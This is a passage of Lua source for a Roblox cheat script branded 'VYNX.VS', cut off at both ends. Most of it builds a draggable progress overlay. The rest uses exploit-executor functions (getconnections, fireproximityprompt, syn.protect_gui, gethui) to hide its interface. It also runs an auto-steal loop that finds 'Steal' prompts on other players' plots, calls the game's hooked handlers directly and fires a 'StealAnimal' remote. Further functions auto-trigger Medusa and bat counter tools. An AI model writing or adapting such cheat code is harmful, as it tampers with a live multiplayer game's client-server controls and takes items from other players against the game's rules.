    veil.Size = UDim2.new(1, 0, 1, 0)
    veil.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    veil.BackgroundTransparency = 0.55
    veil.BorderSizePixel = 0
    veil.ZIndex = 2
    veil.Parent = frame
    Instance.new("UICorner", veil).CornerRadius = UDim.new(0, 14)

    -- VH logo left (large, own blue outline; V blue + H white)
    local logoWrap = Instance.new("Frame", frame)
    logoWrap.Name = "LogoWrap"
    logoWrap.Size = UDim2.new(0, 40, 0, 40)
    logoWrap.Position = UDim2.new(0, 8, 0.5, -20)
    logoWrap.BackgroundColor3 = Color3.fromRGB(4, 12, 20)
    logoWrap.BackgroundTransparency = 0.25
    logoWrap.BorderSizePixel = 0
    logoWrap.ZIndex = 6
    Instance.new("UICorner", logoWrap).CornerRadius = UDim.new(0, 10)
    do
        local ls = Instance.new("UIStroke", logoWrap)
        ls.Color = Color3.fromRGB(40, 160, 255)
        ls.Thickness = 2.2
        ls.Transparency = 0
    end

    local logoV = Instance.new("TextLabel", logoWrap)
    logoV.Name = "LogoV"
    logoV.Size = UDim2.new(0.5, 0, 1, 0)
    logoV.Position = UDim2.new(0, 2, 0, 0)
    logoV.BackgroundTransparency = 1
    logoV.Text = "V"
    logoV.TextColor3 = Color3.fromRGB(40, 140, 255)
    logoV.Font = Enum.Font.GothamBlack
    logoV.TextSize = 20
    logoV.TextXAlignment = Enum.TextXAlignment.Right
    logoV.ZIndex = 7

    local logoH = Instance.new("TextLabel", logoWrap)
    logoH.Name = "LogoH"
    logoH.Size = UDim2.new(0.5, 0, 1, 0)
    logoH.Position = UDim2.new(0.5, -2, 0, 0)
    logoH.BackgroundTransparency = 1
    logoH.Text = "H"
    logoH.TextColor3 = Color3.fromRGB(245, 248, 255)
    logoH.Font = Enum.Font.GothamBlack
    logoH.TextSize = 20
    logoH.TextXAlignment = Enum.TextXAlignment.Left
    logoH.ZIndex = 7

    -- content starts AFTER logo (x = 56)
    local title = Instance.new("TextLabel", frame)
    title.Name = "BrandTitle"
    title.Size = UDim2.new(1, -120, 0, 14)
    title.Position = UDim2.new(0, 56, 0, 6)
    title.BackgroundTransparency = 1
    title.Text = "VYNX.VS"
    title.TextColor3 = Color3.fromRGB(40, 140, 255)
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 12
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 6

    local sub = Instance.new("TextLabel", frame)
    sub.Name = "BrandSub"
    sub.Size = UDim2.new(1, -120, 0, 11)
    sub.Position = UDim2.new(0, 56, 0, 20)
    sub.BackgroundTransparency = 1
    sub.Text = "discord.gg/vynxduels"
    sub.TextColor3 = Color3.fromRGB(140, 175, 210)
    sub.Font = Enum.Font.GothamBold
    sub.TextSize = 9
    sub.TextXAlignment = Enum.TextXAlignment.Left
    sub.ZIndex = 6

    local pctLbl = Instance.new("TextLabel", frame)
    pctLbl.Name = "PctLbl"
    pctLbl.Size = UDim2.new(0, 44, 0, 16)
    pctLbl.Position = UDim2.new(1, -52, 0, 6)
    pctLbl.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    pctLbl.BackgroundTransparency = 0.35
    pctLbl.Text = "0%"
    pctLbl.TextColor3 = Color3.fromRGB(235, 245, 255)
    pctLbl.Font = Enum.Font.GothamBlack
    pctLbl.TextSize = 11
    pctLbl.ZIndex = 6
    Instance.new("UICorner", pctLbl).CornerRadius = UDim.new(0, 7)
    M.statusPctLbl = pctLbl

    local radLbl = Instance.new("TextLabel", frame)
    radLbl.Name = "RadiusLbl"
    radLbl.Size = UDim2.new(0, 0, 0, 0)
    radLbl.BackgroundTransparency = 1
    radLbl.Text = ""
    radLbl.Visible = false
    M.statusRadiusLbl = radLbl

    -- progress track starts AFTER logo (not under it)
    local bg = Instance.new("Frame", frame)
    bg.Name = "Track"
    bg.Size = UDim2.new(1, -68, 0, 10)
    bg.Position = UDim2.new(0, 56, 1, -16)
    bg.BackgroundColor3 = Color3.fromRGB(12, 20, 28)
    bg.BackgroundTransparency = 0.25
    bg.BorderSizePixel = 0
    bg.ClipsDescendants = true
    bg.ZIndex = 4
    Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)
    do
        local tst = Instance.new("UIStroke", bg)
        tst.Color = Color3.fromRGB(40, 140, 255)
        tst.Thickness = 1
        tst.Transparency = 0.45
    end

    local fill = Instance.new("Frame", bg)
    fill.Name = "Fill"
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(40, 140, 255)
    fill.BackgroundTransparency = 0
    fill.BorderSizePixel = 0
    fill.ZIndex = 5
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
    M.statusFill = fill

    local shine = Instance.new("Frame", fill)
    shine.Name = "FillShine"
    shine.Size = UDim2.new(1, 0, 0.45, 0)
    shine.Position = UDim2.new(0, 0, 0.1, 0)
    shine.BackgroundColor3 = accent:Lerp(Color3.fromRGB(255, 255, 255), 0.4)
    shine.BackgroundTransparency = 0.55
    shine.BorderSizePixel = 0
    shine.ZIndex = 6
    Instance.new("UICorner", shine).CornerRadius = UDim.new(1, 0)

    local highlight = Instance.new("Frame", fill)
    highlight.Name = "FillHighlight"
    highlight.Size = UDim2.new(1, 0, 0.18, 0)
    highlight.Position = UDim2.new(0, 0, 0.05, 0)
    highlight.BackgroundColor3 = accent:Lerp(Color3.fromRGB(255, 255, 255), 0.7)
    highlight.BackgroundTransparency = 0.65
    highlight.BorderSizePixel = 0
    highlight.ZIndex = 7
    Instance.new("UICorner", highlight).CornerRadius = UDim.new(1, 0)

    local border = Instance.new("Frame", fill)
    border.Name = "FillBorder"
    border.Size = UDim2.new(1, 0, 0.08, 0)
    border.Position = UDim2.new(0, 0, 0.88, 0)
    border.BackgroundColor3 = Color3.fromRGB(30, 40, 55)
    border.BackgroundTransparency = 0.4
    border.BorderSizePixel = 0
    border.ZIndex = 7
    Instance.new("UICorner", border).CornerRadius = UDim.new(1, 0)

    M.statusStealLbl = nil
    M.statusSubLbl = nil
    M.statusBrandLbl = nil
    M.statusFpsLbl = nil
    M.statusPingLbl = nil
    M.statusDiscordLbl = nil
    M.statusCloseBtn = nil
    M.statusBgImg = nil
    M.statusModeLbl = nil
    M.statusDot = nil
    M.statusStealBg = nil
    M.statusVynxTag = nil
    M.statusFpsTitle = nil
    M.statusPingTitle = nil
    M.updateRadiusMarker = function() end
    M.updateStatusModeBadge = function() end
    M.statusGui = gui
    pcall(function() if M.registerAccentRoot then M.registerAccentRoot(gui) end end)

    pcall(function()
        local sp = M.stealBarPos
        if type(sp) == "table" and type(sp.ox) == "number" then
            frame.Position = UDim2.new(sp.sx or 0.5, sp.ox or 0, sp.sy or 1, sp.oy or -81)
        end
    end)

    do
        local dragging, dragStart, startPos = false, nil, nil
        local function savePos()
            local p = frame.Position
            M.stealBarPos = { sx = p.X.Scale, ox = p.X.Offset, sy = p.Y.Scale, oy = p.Y.Offset }
            pcall(function() if saveCherryConfig then saveCherryConfig() end end)
        end
        frame.InputBegan:Connect(function(input)
            if M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = frame.Position
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if not dragging then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local d = input.Position - dragStart
                frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
        UIS.InputEnded:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
                dragging = false
                savePos()
            end
        end)
    end

    do
        local last, frames = tick(), 0
        M._stealBarStatsConn = RunService.Heartbeat:Connect(function()
            frames = frames + 1
            local now = tick()
            if now - last < 0.75 then return end
            local fps = math.floor(frames / (now - last) + 0.5)
            frames = 0
            last = now
            local pingMs = 0
            pcall(function()
                pingMs = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
            end)
            if pingMs <= 0 then
                pcall(function() pingMs = math.floor(player:GetNetworkPing() * 1000 + 0.5) end)
            end
            if M.statusInfoLbl then
                M.statusInfoLbl.Text = "FPS:" .. tostring(fps) .. "  discord.gg/vynxduels  PING: " .. tostring(pingMs) .. "ms"
            end
            if M.statusRadiusLbl then
                M.statusRadiusLbl.Text = "Radius: " .. tostring((M.Steal and M.Steal.StealRadius) or 60)
            end
        end)
    end
end


function M.buildStatusUI()
    if M.statusGui then
        pcall(function() M.statusGui:Destroy() end)
        M.statusGui = nil
    end
    if M._stealBarStatsConn then
        pcall(function() M._stealBarStatsConn:Disconnect() end)
        M._stealBarStatsConn = nil
    end
    if M._statusDotPulseConn then
        pcall(function() M._statusDotPulseConn:Disconnect() end)
        M._statusDotPulseConn = nil
    end
    if M.stealBarStyle == "New" and M.buildNewStatusUI then
        return M.buildNewStatusUI()
    end
    M.statusSubLbl = nil
    M.statusBrandLbl = nil

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxStatusUI"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 50
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    local parented = false
    if gethui then parented = pcall(function() gui.Parent = gethui() end) end
    if not parented then parented = pcall(function() gui.Parent = game:GetService("CoreGui") end) end
    if not parented then gui.Parent = player:WaitForChild("PlayerGui") end

    local barW = math.clamp(tonumber(M.stealBarSize) or 420, 320, 560)
    local barH = 46
    local RED = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    local WHITE = Color3.fromRGB(255, 255, 255)

    local holder = Instance.new("Frame")
    holder.Name = "StealBarHolder"
    holder.Size = UDim2.new(0, barW, 0, barH)
    holder.Position = UDim2.new(0.5, -math.floor(barW / 2), 1, -56)
    holder.BackgroundTransparency = 1
    holder.BorderSizePixel = 0
    holder.Active = true
    holder.Parent = gui
    M.statusHolder = holder

    local frame = Instance.new("Frame")
    frame.Name = "StealBar"
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.ZIndex = 2
    frame.Parent = holder
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
    local stealStroke = Instance.new("UIStroke", frame)
    stealStroke.Color = Color3.fromRGB(30, 30, 34)
    stealStroke.Thickness = 1
    stealStroke.Transparency = 0.35
    M.statusMain = frame
    M.statusBgImg = nil

    local pctLbl = Instance.new("TextLabel", frame)
    pctLbl.Name = "PctLbl"
    pctLbl.Size = UDim2.new(0, 48, 0, 16)
    pctLbl.Position = UDim2.new(0, 10, 0, 4)
    pctLbl.BackgroundTransparency = 1
    pctLbl.Text = "0%"
    pctLbl.TextColor3 = RED
    pctLbl.Font = Enum.Font.GothamBlack
    pctLbl.TextSize = 13
    pctLbl.TextXAlignment = Enum.TextXAlignment.Left
    pctLbl.ZIndex = 6
    M.statusPctLbl = pctLbl

    local radLbl = Instance.new("TextLabel", frame)
    radLbl.Name = "RadiusLbl"
    radLbl.Size = UDim2.new(0, 80, 0, 14)
    radLbl.Position = UDim2.new(1, -90, 0, 5)
    radLbl.BackgroundTransparency = 1
    radLbl.Text = "Radius: 60"
    radLbl.TextColor3 = RED
    radLbl.Font = Enum.Font.GothamBold
    radLbl.TextSize = 10
    radLbl.TextXAlignment = Enum.TextXAlignment.Right
    radLbl.ZIndex = 6
    M.statusRadiusLbl = radLbl

    local fpsVal = Instance.new("TextLabel", frame)
    fpsVal.Name = "FpsValue"
    fpsVal.Size = UDim2.new(1, -20, 0, 12)
    fpsVal.Position = UDim2.new(0, 10, 0, 18)
    fpsVal.BackgroundTransparency = 1
    fpsVal.Text = "FPS: -- | PING: --ms"
    fpsVal.TextColor3 = Color3.fromRGB(200, 200, 205)
    fpsVal.Font = Enum.Font.GothamBold
    fpsVal.TextSize = 9
    fpsVal.TextXAlignment = Enum.TextXAlignment.Left
    fpsVal.ZIndex = 6
    M.statusFpsLbl = fpsVal

    local pingVal = Instance.new("TextLabel", frame)
    pingVal.Name = "PingValue"
    pingVal.Size = UDim2.new(0, 1, 0, 1)
    pingVal.BackgroundTransparency = 1
    pingVal.Text = ""
    pingVal.Visible = false
    pingVal.ZIndex = 1
    M.statusPingLbl = pingVal

    local track = Instance.new("Frame", frame)
    track.Name = "StealTrack"
    track.Size = UDim2.new(1, -16, 0, 6)
    track.Position = UDim2.new(0, 8, 1, -10)
    track.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
    track.BorderSizePixel = 0
    track.ClipsDescendants = true
    track.ZIndex = 4
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    local fill = Instance.new("Frame", track)
    fill.Name = "Fill"
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = RED
    fill.BorderSizePixel = 0
    fill.ZIndex = 5
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
    M.statusFill = fill

    local stealLbl = Instance.new("TextLabel", frame)
    stealLbl.Name = "StealModeBadge"
    stealLbl.Size = UDim2.new(0, 1, 0, 1)
    stealLbl.BackgroundTransparency = 1
    stealLbl.Text = ""
    stealLbl.Visible = false
    stealLbl.ZIndex = 1
    M.statusModeLbl = stealLbl
    M.statusGui = gui
    pcall(function() if M.registerAccentRoot then M.registerAccentRoot(gui) end end)
    pcall(function()
        if M.applyStealBarTheme then M.applyStealBarTheme(M.accentColor()) end
        if M.refreshStealBarAccent then M.refreshStealBarAccent() end
    end)

    pcall(function()
        local sp = M.stealBarPos
        if type(sp) == "table" and type(sp.ox) == "number" then
            holder.Position = UDim2.new(sp.sx or 0.5, sp.ox or 0, sp.sy or 1, sp.oy or -56)
        end
    end)

    do
        local dragging, dragStart, startPos = false, nil, nil
        local function savePos()
            local p = holder.Position
            M.stealBarPos = { sx = p.X.Scale, ox = p.X.Offset, sy = p.Y.Scale, oy = p.Y.Offset }
            pcall(saveCherryConfig)
        end
        holder.InputBegan:Connect(function(input)
            if M.mobileButtonsLocked or M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true; dragStart = input.Position; startPos = holder.Position
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if not dragging then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local d = input.Position - dragStart
                holder.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
        UIS.InputEnded:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
                dragging = false; savePos()
            end
        end)
    end

    do
        local last, frames = tick(), 0
        M._stealBarStatsConn = RunService.Heartbeat:Connect(function()
            frames = frames + 1
            local now = tick()
            if now - last < 0.75 then return end
            local fps = math.floor(frames / (now - last) + 0.5)
            frames = 0
            last = now
            local pingMs = 0
            pcall(function()
                pingMs = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
            end)
            if pingMs <= 0 then
                pcall(function() pingMs = math.floor(player:GetNetworkPing() * 1000 + 0.5) end)
            end
            if fpsVal and fpsVal.Parent then
                fpsVal.Text = string.format("FPS: %d | PING: %dms", fps, pingMs)
            end
            if M.statusRadiusLbl and M.getActiveStealRadius then
                M.statusRadiusLbl.Text = "Radius: " .. tostring(M.getActiveStealRadius())
            end
        end)
    end
end

function M.updateStealProgress(progress, text)
    progress = math.clamp(tonumber(progress) or 0, 0, 1)

    local armed = (M.Steal and M.Steal.AutoStealEnabled) == true
    if not armed then progress = 0 end
    if M.statusHolder and M.statusHolder.Parent then
        pcall(function() M.statusHolder.BackgroundTransparency = 0 end)
    end

    local newStyle = M.stealBarStyle == "New"
    if M.statusFill then
        if newStyle then
            M.statusFill.Size = UDim2.new(math.clamp(progress, 0, 1), 0, 1, 0)
            M.statusFill.BackgroundColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
        else
            M.statusFill.Size = UDim2.new(math.clamp(progress, 0, 1), 0, 1, 0)
            M.statusFill.BackgroundColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
        end
    end
    if M.statusPctLbl then
        local pct = math.floor(progress * 100 + 0.5)
        M.statusPctLbl.Text = tostring(pct) .. "%"
    end
    if M.statusStealLbl then
        local pct = math.floor(progress * 100 + 0.5)
        M.statusStealLbl.Text = tostring(pct) .. "%"
        M.statusStealLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        M.statusStealLbl.Visible = true
    end
    if M.statusBrandLbl then
        if M.stealBarStyle == "New" then
            M.statusBrandLbl.Text = "AUTO GRAB"
            M.statusBrandLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        else
            if progress > 0.02 then
                M.statusBrandLbl.Text = "SCAN"
                M.statusBrandLbl.TextColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
            else
                M.statusBrandLbl.Text = "STEAL"
                M.statusBrandLbl.TextColor3 = Color3.fromRGB(220, 220, 225)
            end
        end
    end
end

function M.updateStatusRadius()
    if M.statusRadiusLbl then
        M.statusRadiusLbl.Text = "Radius: " .. tostring(M.getActiveStealRadius())
    end
    if M.headerRadiusLbl then
        M.headerRadiusLbl.Text = tostring(M.getActiveStealRadius())
    end
    if M.updateRadiusMarker then
        M.updateRadiusMarker()
    end
end

if not fireproximityprompt then
    fireproximityprompt = (getgenv and getgenv().fireproximityprompt)
        or (genv and genv().fireproximityprompt)
        or function(prompt)
            pcall(function()
                prompt:InputHoldBegin()
                task.wait(0.05)
                prompt:InputHoldEnd()
            end)
        end
end

do
    local BalenciStealData = {}
    local balenciHeartbeatConn = nil

    M.Steal.StealRadius = tonumber(M.Steal.StealRadius) or 61
    M.Steal.StealDuration = tonumber(M.Steal.StealDuration) or 1.3
    M.autoGrabSetDelayRadius = tonumber(M.autoGrabSetDelayRadius) or 9
    M.autoGrabStopTime = tonumber(M.autoGrabStopTime) or 0.96
    M.autoGrabStopEnabled = M.autoGrabStopEnabled ~= false

    local function getHRP()
        local char = player.Character
        return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")) or nil
    end

    local function isMyPlotByName(plotName)
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return false end
        local plot = plots:FindFirstChild(plotName)
        if not plot then return false end
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local yb = sign:FindFirstChild("YourBase")
            if yb and yb:IsA("BillboardGui") then
                return yb.Enabled == true
            end
        end
        return false
    end

    local function getStealRadius()
        if M.getActiveStealRadius then
            return tonumber(M.getActiveStealRadius()) or 61
        end
        return tonumber(M.Steal and M.Steal.StealRadius) or 61
    end

    local function getStealDuration()
        return math.max(tonumber(M.Steal and M.Steal.StealDuration) or 1.3, 0.05)
    end

    local function getStopTime(duration)
        local stopTime = tonumber(M.autoGrabStopTime) or tonumber(M.Steal and M.Steal.StopTime) or 0.96
        return math.clamp(stopTime, 0.05, math.max(duration - 0.01, 0.05))
    end

    local function isStealPrompt(prompt)
        if not (prompt and prompt:IsA("ProximityPrompt")) then return false end
        local action = tostring(prompt.ActionText or "")
        local objectText = tostring(prompt.ObjectText or "")
        return action:find("Steal", 1, true) ~= nil
            or action:lower():find("steal", 1, true) ~= nil
            or objectText:lower():find("steal", 1, true) ~= nil
    end

    local function promptPart(prompt)
        if not prompt then return nil end
        if prompt.Parent and prompt.Parent:IsA("BasePart") then return prompt.Parent end
        if prompt.Parent and prompt.Parent.Parent and prompt.Parent.Parent:IsA("BasePart") then return prompt.Parent.Parent end
        return prompt:FindFirstAncestorWhichIsA("BasePart")
    end

    local function findNearestPrompt()
        local root = getHRP()
        if not root then return nil, nil end
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return nil, nil end

        local radius = getStealRadius()
        local nearestPrompt, nearestDist, nearestName = nil, math.huge, nil

        for _, plot in ipairs(plots:GetChildren()) do
            if isMyPlotByName(plot.Name) then continue end
            local pods = plot:FindFirstChild("AnimalPodiums")
            if not pods then continue end
            for _, pod in ipairs(pods:GetChildren()) do
                local base = pod:FindFirstChild("Base")
                local spawn = base and base:FindFirstChild("Spawn")
                if spawn and spawn:IsA("BasePart") then
                    local dist = (spawn.Position - root.Position).Magnitude
                    if dist < nearestDist and dist <= radius then
                        local found = nil
                        local att = spawn:FindFirstChild("PromptAttachment")
                        if att then
                            for _, child in ipairs(att:GetChildren()) do
                                if isStealPrompt(child) then
                                    found = child
                                    break
                                end
                            end
                        end
                        if not found then
                            for _, child in ipairs(spawn:GetDescendants()) do
                                if isStealPrompt(child) then
                                    found = child
                                    break
                                end
                            end
                        end
                        if found then
                            nearestPrompt = found
                            nearestDist = dist
                            nearestName = pod.Name
                        end
                    end
                end
            end
        end

        return nearestPrompt, nearestName
    end

    local function updateBalenciProgress(progress)
        progress = math.clamp(tonumber(progress) or 0, 0, 1)
        if M.updateStealProgress then
            M.updateStealProgress(progress)
        end
    end

    local function buildStealData(prompt)
        if BalenciStealData[prompt] then return BalenciStealData[prompt] end
        local data = { hold = {}, trigger = {}, ready = true }
        pcall(function()
            if getconnections then
                for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                    if type(c.Function) == "function" then table.insert(data.hold, c.Function) end
                end
                for _, c in ipairs(getconnections(prompt.Triggered)) do
                    if type(c.Function) == "function" then table.insert(data.trigger, c.Function) end
                end
            end
        end)
        BalenciStealData[prompt] = data
        return data
    end

    local function fireBalenciPrompt(prompt, podName, data)
        pcall(function()
            for _, f in ipairs(data.trigger or {}) do task.spawn(f) end
        end)
        pcall(function()
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("StealAnimal")
            if remote and podName and remote:IsA("RemoteEvent") then
                remote:FireServer(podName)
            end
        end)
        pcall(function()
            if prompt and prompt.Fire then
                prompt:Fire()
            elseif fireproximityprompt then
                fireproximityprompt(prompt)
            end
        end)
    end

    local function finishAttempt(data)
        updateBalenciProgress(0)
        if data then data.ready = true end
        M.isStealing = false
    end

    local function executeBalenciSteal(prompt, podName)
        if M.isStealing then return end
        if not (prompt and prompt.Parent) then return end

        local data = buildStealData(prompt)
        if not data or not data.ready then return end

        data.ready = false
        M.isStealing = true
        local duration = getStealDuration()
        local stopTime = getStopTime(duration)
        local delayRadius = math.max(tonumber(M.autoGrabSetDelayRadius) or 9, 1)
        local stealRadius = getStealRadius()
        local stopEnabled = M.autoGrabStopEnabled ~= false
        local promptFired = false

        updateBalenciProgress(0)

        task.spawn(function()
            for _, f in ipairs(data.hold or {}) do task.spawn(f) end
            local startTime = tick()

            if stopEnabled then
                while M.isStealing and M.Steal.AutoStealEnabled do
                    local elapsed = tick() - startTime
                    if elapsed >= stopTime then break end
                    updateBalenciProgress(math.clamp(elapsed / duration, 0, 1))
                    if not prompt.Parent then finishAttempt(data); return end
                    local root = getHRP()
                    local part = promptPart(prompt)
                    if root and part and (root.Position - part.Position).Magnitude > stealRadius then
                        break
                    end
                    task.wait()
                end

                local stopProgress = math.clamp(stopTime / duration, 0, 1)
                updateBalenciProgress(stopProgress)

                local phase2Timeout = math.max(2.99 - stopTime - math.max(duration - stopTime, 0), 0.05)
                local phase2Start = tick()
                while M.isStealing and M.Steal.AutoStealEnabled do
                    if tick() - phase2Start >= phase2Timeout then
                        finishAttempt(data)
                        task.wait()
                        local newPrompt, newName = findNearestPrompt()
                        if newPrompt then executeBalenciSteal(newPrompt, newName) end
                        return
                    end
                    if not prompt.Parent then finishAttempt(data); return end
                    local root = getHRP()
                    local part = promptPart(prompt)
                    if root and part then
                        local dist = (root.Position - part.Position).Magnitude
                        if dist <= delayRadius then
                            break
                        elseif dist > stealRadius then
                            finishAttempt(data)
                            return
                        end
                    end
                    task.wait()
                end

                if M.isStealing and M.Steal.AutoStealEnabled then
                    local fillStart = tick()
                    local fillDuration = math.max(duration - stopTime, 0.05)
                    while M.isStealing and M.Steal.AutoStealEnabled do
                        local fp = math.clamp((tick() - fillStart) / fillDuration, 0, 1)
                        updateBalenciProgress(stopProgress + fp * (1 - stopProgress))
                        if fp >= 1 and not promptFired then
                            promptFired = true
                            fireBalenciPrompt(prompt, podName, data)
                            break
                        end
                        task.wait()
                    end
                end
            else
                while M.isStealing and M.Steal.AutoStealEnabled do
                    local elapsed = tick() - startTime
                    local progress = math.clamp(elapsed / duration, 0, 1)
                    updateBalenciProgress(progress)
                    if not prompt.Parent then break end
                    local root = getHRP()
                    local part = promptPart(prompt)
                    if root and part and (root.Position - part.Position).Magnitude > stealRadius then break end
                    if elapsed >= duration and not promptFired then
                        promptFired = true
                        fireBalenciPrompt(prompt, podName, data)
                        break
                    end
                    task.wait()
                end
            end

            task.wait(0.05)
            finishAttempt(data)
        end)
    end

    local function startBalenciSteal()
        M.Steal.AutoStealEnabled = true
        M.stealMode = "V2"
        M.autoGrabStopEnabled = true
        M.autoGrabSetDelayRadius = tonumber(M.autoGrabSetDelayRadius) or 9
        M.autoGrabStopTime = tonumber(M.autoGrabStopTime) or 0.96
        if M._introUIReady ~= false then
            if M.statusGui then
                M.statusGui.Enabled = true
            elseif M.buildStatusUI then
                pcall(function() M.buildStatusUI() end)
            end
        end
        if M.updateStealProgress then pcall(function() M.updateStealProgress(0) end) end
        if balenciHeartbeatConn then return end
        balenciHeartbeatConn = RunService.Heartbeat:Connect(function()
            if not M.Steal.AutoStealEnabled or M.isStealing then return end
            local prompt, podName = findNearestPrompt()
            if prompt then executeBalenciSteal(prompt, podName) end
        end)
    end

    local function stopBalenciSteal()
        if balenciHeartbeatConn then
            pcall(function() balenciHeartbeatConn:Disconnect() end)
            balenciHeartbeatConn = nil
        end
        M.isStealing = false
        updateBalenciProgress(0)
    end

    function M.startAutoSteal()
        startBalenciSteal()
    end

    function M.stopAutoSteal()
        M.Steal.AutoStealEnabled = false
        stopBalenciSteal()
        if M.updateStealProgress then pcall(function() M.updateStealProgress(0) end) end
    end

    function M.startNormalSteal() startBalenciSteal() end
    function M.stopNormalSteal() stopBalenciSteal() end
    function M.startV2Steal() startBalenciSteal() end
    function M.stopV2Steal() stopBalenciSteal() end
    function M.startSemiSteal() startBalenciSteal() end
    function M.stopSemiSteal() stopBalenciSteal() end
    function M.startV3Steal() startBalenciSteal() end
    function M.stopV3Steal() stopBalenciSteal() end

    function M.setStealRadius(radius)
        M.Steal.StealRadius = tonumber(radius) or 61
        if M.updateStatusRadius then M.updateStatusRadius() end
    end
end

function M.findBat()
    local char=player.Character;if not char then return nil end
    for _,tool in ipairs(char:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end
    local bp=player:FindFirstChild("Backpack");if bp then for _,tool in ipairs(bp:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end end
    return nil
end

function M.findMedusa()
    local c=player.Character;if not c then return nil end
    for _,t in ipairs(c:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower();if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end
    local bp=player:FindFirstChild("Backpack");if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower();if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end end
    return nil
end

function M.useMedusaCounter()
    if M.medusaDebounce then return end;if M.MEDUSA_COOLDOWN>(tick()-M.medusaLastUsed) then return end
    local c=player.Character;if not c then return end;M.medusaDebounce=true
    local med=M.findMedusa();if not med then M.medusaDebounce=false;return end
    if med.Parent~=c then local hum2=c:FindFirstChildOfClass("Humanoid");if hum2 then hum2:EquipTool(med) end end
    pcall(function() med:Activate() end);M.medusaLastUsed=tick();M.medusaDebounce=false
end

function M.onAnchorChanged(part)
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if not part.Anchored then return end
        if M._isInstaResetting then return end

        if M.medusaCounterEnabled and part.Transparency == 1 then
            pcall(function() M.useMedusaCounter() end)
        end
    end)
end

function M.setupMedusa(char)
    for _,c in pairs(M.Conns.anchor) do pcall(function() c:Disconnect() end) end;M.Conns.anchor={}
    if not char then return end
    for _,part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then table.insert(M.Conns.anchor,M.onAnchorChanged(part)) end end
    table.insert(M.Conns.anchor,char.DescendantAdded:Connect(function(part) if part:IsA("BasePart") then table.insert(M.Conns.anchor,M.onAnchorChanged(part)) end end))
end

function M.stopMedusaCounter() for _,c in pairs(M.Conns.anchor) do pcall(function() c:Disconnect() end) end;M.Conns.anchor={} end

function M.findBatForCounter()
    local c=player.Character;if not c then return nil end;local bp=player:FindFirstChildOfClass("Backpack")
    for _,name in ipairs(M.BAT_COUNTER_SLAP_LIST) do local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name));if t then return t end end
    for _,ch in ipairs(c:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end
    if bp then for _,ch in ipairs(bp:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end end
    return nil
end

function M.swingBatForCounter(bat,char)
    local hum2=char:FindFirstChildOfClass("Humanoid")
    if bat.Parent~=char then if hum2 then pcall(function() hum2:EquipTool(bat) end) end;task.wait(0.05) end
    local remote=bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
